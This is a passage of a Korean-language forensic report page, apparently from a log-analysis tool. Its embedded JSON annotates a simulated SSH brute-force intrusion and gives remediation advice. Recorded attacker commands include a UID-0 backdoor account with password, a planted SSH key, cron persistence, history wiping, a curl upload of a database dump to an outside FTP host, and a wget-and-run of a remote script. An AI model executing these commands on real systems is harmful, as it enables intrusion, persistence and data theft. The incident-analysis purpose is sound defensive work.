백도어입니다."},{"ts":1790962120,"cat":"persist","sev":"high","msg":"지속성 확보","cmd":"useradd -o -u 0 -g 0 -M -s /bin/bash sysupd","user":"root","via":"history","tags":["셸 히스토리","auditd 확인"],"src":"/root/.bash_history","line":34,"raw":"useradd -o -u 0 -g 0 -M -s /bin/bash sysupd\n── audit (/var/log/audit/audit.log:97) ──\ntype=SYSCALL msg=audit(1790962120.000:1227): arch=c000003e syscall=59 success=yes exit=0 ppid=3487 pid=3488 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"useradd\" exe=\"/usr/bin/useradd\" key=(null)\ntype=EXECVE msg=audit(1790962120.000:1227): argc=10 a0=\"useradd\" a1=\"-o\" a2=\"-u\" a3=\"0\" a4=\"-g\" a5=\"0\" a6=\"-M\" a7=\"-s\" a8=\"/bin/bash\" a9=\"sysupd\"\ntype=CWD msg=audit(1790962120.000:1227): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790962120.000:1227): proctitle=75736572616464002D6F002D750030002D670030002D4D002D73002F62696E2F6261736800737973757064","ses":"5","sid":"S3","ip":"45.133.1.77","explain":{"summary":["\"sysupd\" 라는 새 계정을 만들면서 UID 를 0 으로 지정했습니다. UID 0 은 root 와 똑같은 최고 권한이라, 이름만 다른 숨은 root 계정(백도어)을 만든 것입니다."],"details":[["-o","이미 root 가 쓰고 있는 UID 0 을 중복해서 쓸 수 있게 허용하는 옵션입니다."],["-M","홈 폴더를 만들지 않아 눈에 덜 띄게 했습니다."]],"check":["/etc/passwd 에서 sysupd 처럼 UID 가 0 인 계정을 찾아 삭제하세요."]}},{"ts":1790962132.0,"cat":"persist","sev":"high","msg":"비밀번호 변경: sysupd","kind":"acct","host":"web01","src":"/var/log/auth.log","line":80,"raw":"Oct  3 02:28:52 web01 chpasswd[2305]: pam_unix(chpasswd:chauthtok): password changed for sysupd","pid":"2305","sid":"S3","ip":"45.133.1.77","ip_inferred":true,"tags":["세션 시간대로 추정"],"note":"계정 정보가 바뀌었습니다. 공격 시간대라면 백도어 계정을 만들거나 비밀번호를 바꾼 것일 수 있습니다."},{"ts":1790962132,"cat":"persist","sev":"high","msg":"지속성 확보","cmd":"echo 'sysupd:Upd@te99' | chpasswd","user":"root","via":"history","tags":["셸 히스토리","auditd 확인"],"src":"/root/.bash_history","line":36,"raw":"echo 'sysupd:Upd@te99' | chpasswd\n── audit (/var/log/audit/audit.log:101) ──\ntype=SYSCALL msg=audit(1790962132.000:1228): arch=c000003e syscall=59 success=yes exit=0 ppid=8069 pid=8070 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"chpasswd\" exe=\"/usr/bin/chpasswd\" key=(null)\ntype=EXECVE msg=audit(1790962132.000:1228): argc=1 a0=\"chpasswd\"\ntype=CWD msg=audit(1790962132.000:1228): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790962132.000:1228): proctitle=6368706173737764","ses":"5","sid":"S3","ip":"45.133.1.77","explain":{"summary":["\"sysupd\" 계정의 비밀번호를 설정했습니다. 만들어 둔 계정으로 나중에 다시 로그인하려는 것입니다."],"details":[],"check":[]}},{"ts":1790962170,"cat":"persist","sev":"high","msg":"지속성 확보","cmd":"echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK7xq attacker@kali' >> /root/.ssh/authorized_keys","user":"root","via":"history","tags":["셸 히스토리"],"src":"/root/.bash_history","line":38,"raw":"echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK7xq attacker@kali' >> /root/.ssh/authorized_keys","sid":"S3","ip":"45.133.1.77","explain":{"summary":["SSH 공개키를 root 계정의 authorized_keys 에 추가했습니다. 이 키의 짝(개인키)을 가진 사람은 비밀번호 없이 언제든 다시 접속할 수 있는 백도어입니다."],"details":[["attacker@kali","키 끝에 붙은 이름은 키를 만든 컴퓨터의 \"사용자@호스트\" 입니다. 공격자 환경을 짐작할 단서가 됩니다."]],"check":["/root/.ssh/authorized_keys 에서 모르는 키를 지우세요."]}},{"ts":1790962205,"cat":"persist","sev":"high","msg":"지속성 확보","cmd":"(crontab -l 2>/dev/null; echo '*/10 * * * * /tmp/.x/k.sh') | crontab -","user":"root","via":"history","tags":["셸 히스토리","정찰","auditd 확인"],"src":"/root/.bash_history","line":40,"raw":"(crontab -l 2>/dev/null; echo '*/10 * * * * /tmp/.x/k.sh') | crontab -\n── audit (/var/log/audit/audit.log:105) ──\ntype=SYSCALL msg=audit(1790962205.000:1229): arch=c000003e syscall=59 success=yes exit=0 ppid=4686 pid=4687 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"crontab\" exe=\"/usr/bin/crontab\" key=(null)\ntype=EXECVE msg=audit(1790962205.000:1229): argc=2 a0=\"crontab\" a1=\"-l\"\ntype=CWD msg=audit(1790962205.000:1229): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790962205.000:1229): proctitle=63726F6E746162002D6C\n── audit (/var/log/audit/audit.log:109) ──\ntype=SYSCALL msg=audit(1790962206.000:1230): arch=c000003e syscall=59 success=yes exit=0 ppid=7065 pid=7066 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"crontab\" exe=\"/usr/bin/crontab\" key=(null)\ntype=EXECVE msg=audit(1790962206.000:1230): argc=2 a0=\"crontab\" a1=\"-\"\ntype=CWD msg=audit(1790962206.000:1230): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790962206.000:1230): proctitle=63726F6E746162002D","ses":"5","sid":"S3","ip":"45.133.1.77","explain":{"summary":["기존 예약 작업은 그대로 둔 채 새 작업을 한 줄 덧붙여 다시 등록했습니다. 관리자가 기존 목록만 보고 지나치기 쉽게 만드는 방법입니다.","이렇게 등록한 예약 작업(cron)은 서버가 재부팅되거나 프로세스를 죽여도 다시 실행되므로 \"지속성 확보\" 수법입니다."],"details":[["/tmp/.x","점(.)으로 시작하는 이름은 ls 로 잘 안 보이는 숨김 폴더·파일입니다. 공격자가 작업 공간으로 자주 씁니다."],["*/10 * * * * /tmp/.x/k.sh","\"10분마다 /tmp/.x/k.sh 를 실행하라\"는 예약 작업 설정입니다."]],"check":["crontab -l 과 /etc/cron* 에서 이 항목을 지우세요."]}},{"ts":1790962280,"cat":"antiforensic","sev":"crit","msg":"흔적 삭제","cmd":"unset HISTFILE","user":"root","via":"history","tags":["셸 히스토리"],"src":"/root/.bash_history","line":42,"raw":"unset HISTFILE","sid":"S3","ip":"45.133.1.77","explain":{"summary":["이후에 치는 명령이 히스토리 파일(~/.bash_history)에 저장되지 않도록 설정했습니다. 이 다음 명령들은 auditd 등 다른 로그로만 확인할 수 있습니다."],"details":[],"check":[]}},{"ts":1790962282,"cat":"antiforensic","sev":"crit","msg":"흔적 삭제","cmd":"history -c","user":"root","via":"history","tags":["셸 히스토리"],"src":"/root/.bash_history","line":44,"raw":"history -c","sid":"S3","ip":"45.133.1.77","explain":{"summary":["지금까지 입력한 명령 기록을 셸에서 지웠습니다. 흔적을 감추려는 행동입니다. 이미 파일에 저장된 기록이나 auditd 기록은 남아 있을 수 있습니다."],"details":[],"check":[]}},{"ts":1790962430.0,"cat":"session","sev":"info","msg":"연결 종료","kind":"disconnect","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":81,"raw":"Oct  3 02:33:50 web01 sshd[2211]: Received disconnect from 45.133.1.77 port 51544:11: disconnected by user","pid":"2211","sid":"S3"},{"ts":1790962430.0,"cat":"session","sev":"info","msg":"연결 종료","kind":"disconnect","user":"root","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":82,"raw":"Oct  3 02:33:50 web01 sshd[2211]: Disconnected from user root 45.133.1.77 port 51544","pid":"2211","sid":"S3"},{"ts":1790962430.0,"cat":"session","sev":"info","msg":"SSH 세션 종료","kind":"sess_close","user":"root","host":"web01","src":"/var/log/auth.log","line":83,"raw":"Oct  3 02:33:50 web01 sshd[2211]: pam_unix(sshd:session): session closed for user root","pid":"2211","sid":"S3","ip":"45.133.1.77"},{"ts":1790962500.0,"cat":"db","sev":"info","msg":"MySQL 접속: wp@localhost","kind":"mysql_conn","user":"wp","src":"/var/log/mysql/mysql.log","line":34,"raw":"2026-10-02T17:35:00.000000Z\t   43 Connect\twp@localhost on wordpress using TCP/IP","tags":["MySQL general log"],"note":"DB 서버 접속 기록입니다. 같은 시각의 SSH 세션과 함께 보면 누가 접속했는지 알 수 있습니다."},{"ts":1790962862.0,"cat":"auth","sev":"crit","msg":"SSH 로그인 성공 (password) — 직전 실패 36회 후 성공 (무차별 대입 성공 의심)","kind":"login_ok","user":"root","ip":"45.133.1.77","method":"password","host":"web01","src":"/var/log/auth.log","line":84,"raw":"Oct  3 02:41:02 web01 sshd[2390]: Accepted password for root from 45.133.1.77 port 51702 ssh2","pid":"2390","tags":["무차별 대입 성공"],"sid":"S4","note":"같은 IP 가 여러 계정·비밀번호를 짧은 시간에 연달아 시도하다가 결국 로그인에 성공했습니다. 비밀번호가 추측(무차별 대입)으로 뚫린 것으로 보입니다. 즉시 비밀번호 변경과 IP 차단이 필요합니다."},{"ts":1790962862.0,"cat":"session","sev":"info","msg":"SSH 세션 시작","kind":"sess_open","user":"root","host":"web01","src":"/var/log/auth.log","line":85,"raw":"Oct  3 02:41:02 web01 sshd[2390]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)","pid":"2390","sid":"S4","ip":"45.133.1.77"},{"ts":1790962863.0,"cat":"transfer","sev":"med","msg":"SSH 서브시스템 요청: sftp (파일 전송 세션)","kind":"sftp_req","user":"root","host":"web01","src":"/var/log/auth.log","line":86,"raw":"Oct  3 02:41:03 web01 sshd[2390]: subsystem request for sftp by user root","pid":"2390","sid":"S4","ip":"45.133.1.77","note":"SFTP(파일 전송) 세션을 열었습니다. 이 접속에서는 명령을 친 게 아니라 파일을 주고받았습니다."},{"ts":1790962863.0,"cat":"session","sev":"info","msg":"audit 로그인 기록","kind":"audit_login","user":"root","ip":"45.133.1.77","ses":"6","pid":"2390","src":"/var/log/audit/audit.log","line":113,"raw":"type=USER_LOGIN msg=audit(1790962863.000:1231): pid=2390 uid=0 auid=0 ses=6 subj=unconfined msg='op=login id=0 exe=\"/usr/sbin/sshd\" hostname=? addr=45.133.1.77 terminal=/dev/pts/1 res=success'","sid":"S4","note":"auditd 가 남긴 로그인 기록입니다. auth.log 가 지워져도 따로 남아 있을 수 있어 교차 확인에 씁니다."},{"ts":1790962951.0,"cat":"transfer","sev":"crit","msg":"SFTP 다운로드 (서버 → 외부 유출) 46.0 MB","kind":"sftp_xfer","user":"root","ip":"45.133.1.77","path":"/tmp/.x/www.tgz","bytes":48234496,"cmd":"/tmp/.x/www.tgz","host":"web01","src":"/var/log/auth.log","line":89,"raw":"Oct  3 02:42:31 web01 internal-sftp[2392]: close \"/tmp/.x/www.tgz\" bytes read 48234496 written 0","pid":"2392","sid":"S4","note":"\"bytes read\" 는 서버가 파일을 읽어서 상대에게 보낸 양입니다. 즉 접속한 쪽이 이 파일을 내려받아 간 것(유출)입니다."},{"ts":1790962978.0,"cat":"transfer","sev":"crit","msg":"SFTP 다운로드 (서버 → 외부 유출) 9.0 MB","kind":"sftp_xfer","user":"root","ip":"45.133.1.77","path":"/tmp/.x/crm.sql","bytes":9437184,"cmd":"/tmp/.x/crm.sql","host":"web01","src":"/var/log/auth.log","line":91,"raw":"Oct  3 02:42:58 web01 internal-sftp[2392]: close \"/tmp/.x/crm.sql\" bytes read 9437184 written 0","pid":"2392","sid":"S4","note":"\"bytes read\" 는 서버가 파일을 읽어서 상대에게 보낸 양입니다. 즉 접속한 쪽이 이 파일을 내려받아 간 것(유출)입니다."},{"ts":1790962985.0,"cat":"transfer","sev":"med","msg":"SFTP remove","kind":"sftp_op","user":"root","ip":"45.133.1.77","cmd":"/tmp/.x/crm.sql","host":"web01","src":"/var/log/auth.log","line":92,"raw":"Oct  3 02:43:05 web01 internal-sftp[2392]: remove name \"/tmp/.x/crm.sql\"","pid":"2392","sid":"S4","note":"SFTP 로 파일을 지우거나 이름을 바꿨습니다. 가져간 뒤 흔적을 정리한 것일 수 있습니다."},{"ts":1790962990.0,"cat":"session","sev":"info","msg":"연결 종료","kind":"disconnect","user":"root","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":94,"raw":"Oct  3 02:43:10 web01 sshd[2390]: Disconnected from user root 45.133.1.77 port 51702","pid":"2390","sid":"S4"},{"ts":1790962990.0,"cat":"session","sev":"info","msg":"SSH 세션 종료","kind":"sess_close","user":"root","host":"web01","src":"/var/log/auth.log","line":95,"raw":"Oct  3 02:43:10 web01 sshd[2390]: pam_unix(sshd:session): session closed for user root","pid":"2390","sid":"S4","ip":"45.133.1.77"},{"ts":1790963130.0,"cat":"auth","sev":"crit","msg":"SSH 로그인 성공 (publickey) — 무차별 대입을 하던 IP 가 SSH 키로 접속 (심어 둔 키 의심)","kind":"login_ok","user":"root","ip":"45.133.1.77","method":"publickey","detail":"ED25519 SHA256:Atk3rK1ckK3yF1ngerPr1nt","host":"web01","src":"/var/log/auth.log","line":96,"raw":"Oct  3 02:45:30 web01 sshd[2420]: Accepted publickey for root from 45.133.1.77 port 51766 ssh2: ED25519 SHA256:Atk3rK1ckK3yF1ngerPr1nt","pid":"2420","tags":["침입 IP 키 로그인","키: ED25519 SHA256:Atk3rK1ckK3yF1ngerPr1nt"],"sid":"S5","note":"비밀번호를 대입하던 그 IP 가 이번에는 비밀번호 없이 SSH 키로 들어왔습니다. 공격자가 침입 후 authorized_keys 에 자기 키를 심어 두고 그 키로 다시 접속한 것으로 보입니다. 비밀번호를 바꿔도 이 키가 남아 있으면 계속 들어올 수 있습니다."},{"ts":1790963130.0,"cat":"session","sev":"info","msg":"SSH 세션 시작","kind":"sess_open","user":"root","host":"web01","src":"/var/log/auth.log","line":97,"raw":"Oct  3 02:45:30 web01 sshd[2420]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)","pid":"2420","sid":"S5","ip":"45.133.1.77"},{"ts":1790963131.0,"cat":"session","sev":"info","msg":"audit 로그인 기록","kind":"audit_login","user":"root","ip":"45.133.1.77","ses":"7","pid":"2420","src":"/var/log/audit/audit.log","line":114,"raw":"type=USER_LOGIN msg=audit(1790963131.000:1232): pid=2420 uid=0 auid=0 ses=7 subj=unconfined msg='op=login id=0 exe=\"/usr/sbin/sshd\" hostname=? addr=45.133.1.77 terminal=/dev/pts/1 res=success'","sid":"S5","note":"auditd 가 남긴 로그인 기록입니다. auth.log 가 지워져도 따로 남아 있을 수 있어 교차 확인에 씁니다."},{"ts":1790963131.0,"cat":"transfer","sev":"crit","msg":"scp 원격 다운로드 (서버 → 외부 유출)","cmd":"scp -f /tmp/.x/db.sql.gz","user":"root","via":"audit","tags":["auditd","파일 전송"],"src":"/var/log/audit/audit.log","line":115,"raw":"type=SYSCALL msg=audit(1790963131.000:1233): arch=c000003e syscall=59 success=yes exit=0 ppid=8572 pid=8573 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=7 comm=\"scp\" exe=\"/usr/bin/scp\" key=(null)\ntype=EXECVE msg=audit(1790963131.000:1233): argc=3 a0=\"scp\" a1=\"-f\" a2=\"/tmp/.x/db.sql.gz\"\ntype=CWD msg=audit(1790963131.000:1233): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790963131.000:1233): proctitle=736370002D66002F746D702F2E782F64622E73716C2E677A","ses":"7","pid":"8573","cwd":"/root","exe":"/usr/bin/scp","sid":"S5","ip":"45.133.1.77","explain":{"summary":["외부에서 이 서버의 /tmp/.x/db.sql.gz 를 scp 로 가져갔습니다(유출). \"scp -f\" 는 공격자가 자기 PC에서 \"scp 계정@이서버:/tmp/.x/db.sql.gz .\" 처럼 내려받기를 실행했을 때 이 서버 쪽에서 자동으로 실행되는 명령이라, 이 기록이 있으면 파일이 밖으로 복사된 것입니다."],"details":[["/tmp/.x","점(.)으로 시작하는 이름은 ls 로 잘 안 보이는 숨김 폴더·파일입니다. 공격자가 작업 공간으로 자주 씁니다."]],"check":["이 파일에 무엇이 들어 있었는지 확인하세요. 같은 세션의 접속 IP 가 파일을 받아간 곳입니다."]}},{"ts":1790963144.0,"cat":"session","sev":"info","msg":"연결 종료","kind":"disconnect","user":"root","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":98,"raw":"Oct  3 02:45:44 web01 sshd[2420]: Disconnected from user root 45.133.1.77 port 51766","pid":"2420","sid":"S5"},{"ts":1790963144.0,"cat":"session","sev":"info","msg":"SSH 세션 종료","kind":"sess_close","user":"root","host":"web01","src":"/var/log/auth.log","line":99,"raw":"Oct  3 02:45:44 web01 sshd[2420]: pam_unix(sshd:session): session closed for user root","pid":"2420","sid":"S5","ip":"45.133.1.77"},{"ts":1790963410.0,"cat":"auth","sev":"crit","msg":"SSH 로그인 성공 (password) — UID 0 백도어 계정으로 로그인","kind":"login_ok","user":"sysupd","ip":"91.240.118.5","method":"password","host":"web01","src":"/var/log/auth.log","line":100,"raw":"Oct  3 02:50:10 web01 sshd[2501]: Accepted password for sysupd from 91.240.118.5 port 40211 ssh2","pid":"2501","tags":["백도어 계정"],"sid":"S6","note":"공격자가 만들어 둔 백도어 계정으로 다시 로그인했습니다. 처음 침입 경로를 막아도 이 계정으로 계속 들어올 수 있습니다."},{"ts":1790963410.0,"cat":"session","sev":"info","msg":"SSH 세션 시작","kind":"sess_open","user":"sysupd","host":"web01","src":"/var/log/auth.log","line":101,"raw":"Oct  3 02:50:10 web01 sshd[2501]: pam_unix(sshd:session): session opened for user sysupd(uid=0) by (uid=0)","pid":"2501","sid":"S6","ip":"91.240.118.5"},{"ts":1790963411.0,"cat":"session","sev":"info","msg":"audit 로그인 기록","kind":"audit_login","user":"root","ip":"91.240.118.5","ses":"8","pid":"2501","src":"/var/log/audit/audit.log","line":119,"raw":"type=USER_LOGIN msg=audit(1790963411.000:1234): pid=2501 uid=0 auid=0 ses=8 subj=unconfined msg='op=login id=0 exe=\"/usr/sbin/sshd\" hostname=? addr=91.240.118.5 terminal=/dev/pts/1 res=success'","sid":"S6","note":"auditd 가 남긴 로그인 기록입니다. auth.log 가 지워져도 따로 남아 있을 수 있어 교차 확인에 씁니다."},{"ts":1790963411,"cat":"session","sev":"info","msg":"로그인 기록 (wtmp, pts/1)","kind":"wtmp_login","user":"sysupd","ip":"91.240.118.5","tty":"pts/1","pid":"2503","src":"/var/log/wtmp","line":5,"sid":"S6","note":"wtmp(last 명령이 읽는 파일)에 남은 로그인 기록입니다."},{"ts":1790963420.0,"cat":"recon","sev":"low","msg":"정찰","cmd":"id","user":"sysupd","via":"audit","tags":["auditd","audit 계정=root"],"src":"/var/log/audit/audit.log","line":120,"raw":"type=SYSCALL msg=audit(1790963420.000:1235): arch=c000003e syscall=59 success=yes exit=0 ppid=7354 pid=7355 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=8 comm=\"id\" exe=\"/usr/bin/id\" key=(null)\ntype=EXECVE msg=audit(1790963420.000:1235): argc=1 a0=\"id\"\ntype=CWD msg=audit(1790963420.000:1235): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790963420.000:1235): proctitle=6964","ses":"8","pid":"7355","cwd":"/root","exe":"/usr/bin/id","sid":"S6","ip":"91.240.118.5","explain":{"summary":["현재 계정의 UID와 소속 그룹을 확인했습니다. uid=0 이면 root(최고 관리자) 권한이라는 뜻입니다."],"details":[],"check":[]}},{"ts":1790963431.0,"cat":"recon","sev":"high","msg":"자격증명 탐색","cmd":"cat /etc/shadow","user":"sysupd","via":"audit","tags":["auditd","audit 계정=root"],"src":"/var/log/audit/audit.log","line":124,"raw":"type=SYSCALL msg=audit(1790963431.000:1236): arch=c000003e syscall=59 success=yes exit=0 ppid=6501 pid=6502 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=8 comm=\"cat\" exe=\"/usr/bin/cat\" key=(null)\ntype=EXECVE msg=audit(1790963431.000:1236): argc=2 a0=\"cat\" a1=\"/etc/shadow\"\ntype=CWD msg=audit(1790963431.000:1236): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790963431.000:1236): proctitle=636174002F6574632F736861646F77","ses":"8","pid":"6502","cwd":"/root","exe":"/usr/bin/cat","sid":"S6","ip":"91.240.118.5","explain":{"summary":["계정 비밀번호 해시가 담긴 /etc/shadow 를 열람했습니다. 해시를 가져가 크래킹하면 실제 비밀번호를 알아낼 수 있습니다."],"details":[],"check":["서버의 모든 계정 비밀번호를 바꾸는 것이 안전합니다."]}},{"ts":1790963462.0,"cat":"cmd","sev":"info","msg":"명령 실행","cmd":"ls -la /tmp/.x","user":"sysupd","via":"audit","tags":["auditd","audit 계정=root"],"src":"/var/log/audit/audit.log","line":128,"raw":"type=SYSCALL msg=audit(1790963462.000:1237): arch=c000003e syscall=59 success=yes exit=0 ppid=5572 pid=5573 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=8 comm=\"ls\" exe=\"/usr/bin/ls\" key=(null)\ntype=EXECVE msg=audit(1790963462.000:1237): argc=3 a0=\"ls\" a1=\"-la\" a2=\"/tmp/.x\"\ntype=CWD msg=audit(1790963462.000:1237): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790963462.000:1237): proctitle=6C73002D6C61002F746D702F2E78","ses":"8","pid":"5573","cwd":"/root","exe":"/usr/bin/ls","sid":"S6","ip":"91.240.118.5","explain":{"summary":["/tmp/.x 폴더 안의 파일 목록을 봤습니다. 숨김 파일까지 자세히 봤습니다."],"details":[["/tmp/.x","점(.)으로 시작하는 이름은 ls 로 잘 안 보이는 숨김 폴더·파일입니다. 공격자가 작업 공간으로 자주 씁니다."]],"check":[]}},{"ts":1790963500.0,"cat":"exec","sev":"crit","msg":"리버스 셸 의심","cmd":"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'","user":"sysupd","via":"audit","tags":["auditd","악성 실행 의심","audit 계정=root"],"src":"/var/log/audit/audit.log","line":132,"raw":"type=SYSCALL msg=audit(1790963500.000:1238): arch=c000003e syscall=59 success=yes exit=0 ppid=6813 pid=6814 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=8 comm=\"python3\" exe=\"/usr/bin/python3\" key=(null)\ntype=EXECVE msg=audit(1790963500.000:1238): argc=3 a0=\"python3\" a1=\"-c\" a2=696D706F7274207074793B7074792E737061776E28222F62696E2F626173682229\ntype=CWD msg=audit(1790963500.000:1238): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790963500.000:1238): proctitle=707974686F6E33002D6300696D706F7274207074793B7074792E737061776E28222F62696E2F626173682229","ses":"8","pid":"6814","cwd":"/root","exe":"/usr/bin/python3","sid":"S6","ip":"91.240.118.5","explain":{"summary":["제대로 된 대화형 터미널(TTY)을 얻으려고 파이썬으로 bash 를 새로 띄웠습니다. 리버스 셸 등으로 들어온 직후 자주 쓰는 명령입니다."],"details":[],"check":[]}},{"ts":1790963522.0,"cat":"session","sev":"info","msg":"연결 종료","kind":"disconnect","user":"sysupd","ip":"91.240.118.5","host":"web01","src":"/var/log/auth.log","line":102,"raw":"Oct  3 02:52:02 web01 sshd[2501]: Disconnected from user sysupd 91.240.118.5 port 40211","pid":"2501","sid":"S6"},{"ts":1790963522.0,"cat":"session","sev":"info","msg":"SSH 세션 종료","kind":"sess_close","user":"sysupd","host":"web01","src":"/var/log/auth.log","line":103,"raw":"Oct  3 02:52:02 web01 sshd[2501]: pam_unix(sshd:session): session closed for user sysupd","pid":"2501","sid":"S6","ip":"91.240.118.5"},{"ts":null,"cat":"privesc","sev":"med","msg":"권한 상승","cmd":"sudo apt update","user":"alice","via":"history","tags":["셸 히스토리"],"src":"/home/alice/.bash_history","line":1,"raw":"sudo apt update","explain":{"summary":["설치할 수 있는 패키지 목록을 최신으로 갱신했습니다. 일반적인 관리 작업입니다."],"details":[["sudo","root(관리자) 권한으로 실행했습니다."]],"check":[]}},{"ts":null,"cat":"cmd","sev":"info","msg":"명령 실행","cmd":"df -h","user":"alice","via":"history","tags":["셸 히스토리"],"src":"/home/alice/.bash_history","line":2,"raw":"df -h","explain":{"summary":["디스크 남은 용량을 확인하는 명령입니다."],"details":[],"check":[]}},{"ts":null,"cat":"cmd","sev":"info","msg":"명령 실행","cmd":"ls -la /var/www","user":"alice","via":"history","tags":["셸 히스토리"],"src":"/home/alice/.bash_history","line":3,"raw":"ls -la /var/www","explain":{"summary":["/var/www 폴더 안의 파일 목록을 봤습니다. 숨김 파일까지 자세히 봤습니다."],"details":[],"check":[]}},{"ts":null,"cat":"cmd","sev":"info","msg":"명령 실행","cmd":"exit","user":"alice","via":"history","tags":["셸 히스토리"],"src":"/home/alice/.bash_history","line":4,"raw":"exit","explain":{"summary":["셸을 종료(로그아웃)했습니다."],"details":[],"check":[]}}],"sessions":[{"id":"S1","user":"alice","ip":"10.0.0.15","host":"web01","method":"publickey","start":1790899331.0,"end":1790900402.0,"pid":"1101","tty":null,"sources":["auth"],"fails_before":0,"cats":{"auth":1,"cmd":1},"n":5,"max_sev":"med","last":1790900402.0},{"id":"S2","user":"alice","ip":"10.0.0.15","host":"web01","method":"publickey","start":1790958612.0,"end":1790959530.0,"pid":"1802","tty":"pts/0","sources":["auth","wtmp","audit"],"fails_before":0,"cats":{"auth":1,"cmd":3,"privesc":1},"n":11,"max_sev":"med","last":1790959530.0},{"id":"S3","user":"root","ip":"45.133.1.77","host":"web01","method":"password","start":1790961247.0,"end":1790962430.0,"pid":"2211","tty":"pts/1","sources":["auth","audit","wtmp"],"fails_before":36,"cats":{"auth":1,"recon":7,"db":8,"cmd":3,"transfer":2,"exec":2,"persist":6,"antiforensic":2},"n":37,"max_sev":"crit","last":1790962430.0},{"id":"S4","user":"root","ip":"45.133.1.77","host":"web01","method":"password · sftp","start":1790962862.0,"end":1790962990.0,"pid":"2390","tty":null,"sources":["auth","audit"],"fails_before":36,"cats":{"auth":1,"transfer":4},"n":9,"max_sev":"crit","last":1790962990.0},{"id":"S5","user":"root","ip":"45.133.1.77","host":"web01","method":"publickey","start":1790963130.0,"end":1790963144.0,"pid":"2420","tty":null,"sources":["auth","audit"],"fails_before":36,"cats":{"auth":1,"transfer":1},"n":6,"max_sev":"crit","last":1790963144.0},{"id":"S6","user":"sysupd","ip":"91.240.118.5","host":"web01","method":"password","start":1790963410.0,"end":1790963522.0,"pid":"2501","tty":"pts/1","sources":["auth","audit","wtmp"],"fails_before":0,"cats":{"auth":1,"recon":2,"cmd":1,"exec":1},"n":10,"max_sev":"crit","last":1790963522.0}],"ips":[{"ip":"45.133.1.77","private":false,"fails":36,"ok":3,"tried":[["root",12],["admin",6],["test",3],["oracle",3],["ubuntu",3],["postgres",3],["git",3],["deploy",3]],"ok_users":["root"],"first":1790961003.0,"last":1790963144.0,"cats":{"recon":7,"db":8,"cmd":3,"transfer":7,"exec":2,"persist":6,"antiforensic":2},"sev":{"info":48,"low":45,"crit":14,"high":9,"med":3},"sessions":["S3","S4","S5"],"score":377.2},{"ip":"91.240.118.5","private":false,"fails":0,"ok":1,"tried":[],"ok_users":["sysupd"],"first":1790963410.0,"last":1790963522.0,"cats":{"recon":2,"cmd":1,"exec":1},"sev":{"crit":2,"info":6,"low":1,"high":1},"sessions":["S6"],"score":66.0},{"ip":"10.0.0.15","private":true,"fails":0,"ok":2,"tried":[],"ok_users":["alice"],"first":1790899331.0,"last":1790959530.0,"cats":{"cmd":4,"privesc":1},"sev":{"med":3,"info":13},"sessions":["S1","S2"],"score":33.0},{"ip":"103.152.18.4","private":false,"fails":2,"ok":0,"tried":[["oracle",1],["root",1]],"ok_users":[],"first":1790919669.0,"last":1790919675.0,"cats":{},"sev":{"info":1,"low":2},"sessions":[],"score":0.4}],"histories":[{"path":"/home/alice/.bash_history","user":"alice","db":false,"entries":[[1,null,"sudo apt update"],[2,null,"df -h"],[3,null,"ls -la /var/www"],[4,null,"exit"]],"size":43,"mtime":1790964000.0,"with_ts":0},{"path":"/root/.bash_history","user":"root","db":false,"entries":[[2,1790961260,"whoami"],[4,1790961265,"id"],[6,1790961271,"uname -a"],[8,1790961280,"cat /etc/passwd"],[10,1790961292,"ss -tlnp"],[12,1790961310,"ps aux | grep -E 'mysql|postgres'"],[14,1790961340,"cat /var/www/html/wp-config.php"],[16,1790961390,"mysql -uroot -p'Wp!2024db' -e 'show databases'"],[18,1790961482,"mkdir -p /tmp/.x"],[20,1790961495,"mysqldump -uroot -p'Wp!2024db' --all-databases | gzip > /tmp/.x/db.sql.gz"],[22,1790961760,"sudo -u postgres pg_dump crm > /tmp/.x/crm.sql"],[24,1790961845,"tar czf /tmp/.x/www.tgz /var/www/html"],[26,1790961930,"curl -T /tmp/.x/db.sql.gz ftp://185.220.101.4/up/ --user anon:anon"],[28,1790962020,"wget -q http://185.220.101.4/k.sh -O /tmp/.x/k.sh"],[30,1790962030,"chmod +x /tmp/.x/k.sh"],[32,1790962035,"nohup /tmp/.x/k.sh >/dev/null 2>&1 &"],[34,1790962120,"useradd -o -u 0 -g 0 -M -s /bin/bash sysupd"],[36,1790962132,"echo 'sysupd:Upd@te99' | chpasswd"],[38,1790962170,"echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK7xq attacker@kali' >> /root/.ssh/authorized_keys"],[40,1790962205,"(crontab -l 2>/dev/null; echo '*/10 * * * * /tmp/.x/k.sh') | crontab -"],[42,1790962280,"unset HISTFILE"],[44,1790962282,"history -c"]],"size":1041,"mtime":1790964000.0,"with_ts":22}]}</script>
+<script>
+(function(){
+'use strict';
+const SEVS=['info','low','med','high','crit'], SEV_L={info:'정보',low:'낮음',med:'중간',high:'높음',crit:'치명'};
+const sr = s => SEVS.indexOf(s);
+let D, E, CATS, M, bySid, SESS, OFF, HIST, bySrcLine;
